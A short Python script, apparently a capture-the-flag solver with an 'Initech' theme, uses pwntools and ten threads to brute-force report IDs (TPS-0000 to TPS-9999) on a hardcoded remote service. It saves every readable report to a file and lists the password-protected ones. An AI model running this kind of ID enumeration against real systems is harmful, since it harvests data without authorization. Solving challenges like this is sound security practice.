from pwn import remote, log, context
import concurrent.futures

output = 'initech2020.txt'
concurrent_threads = 10

f = open(output, 'w+')
interesting_tps = []

def connect():
    c = remote('161.35.239.216', 5000)
    c.recvuntil(b'TPS Cover Sheet')
    c.sendline(b'1')
    c.recvuntil(b'TPS-XXXX):\n')
    return c

def take_100(batch):
    log.info('Starting thread ' + str(batch))
    c = connect()
    for i in range(100):
        num = '{0:02}'.format(i)
        to_send = 'TPS-' + '{0:02}'.format(batch) + num
        c.sendline(to_send.encode())

        response = c.recvline()
        if response == b'\n':
            interesting_tps.append(to_send)
            report = c.recvall()

            #print('found report ' + to_send + '\n' + report.decode())
            f.write('Report ' + to_send + ':\n' + report.decode() + '\n')

            c = connect()
        elif response == b'Report is password protected\n':
            print(to_send + ' is password protected\n')
            f.write(to_send + ' is password protected\n')
            interesting_tps.append(to_send)
            c.close()
            c = connect()
        else:
            c.recvline()
            c.recvline()

    log.info('Closing thread ' + str(batch))

c = connect()

with concurrent.futures.ThreadPoolExecutor(max_workers=concurrent_threads) as executor:
    executor.map(take_100, range(100))

f.close()

print('\nInteresting reports: ' + " ".join(interesting_tps) + '\nCheck "./' + output + '"')
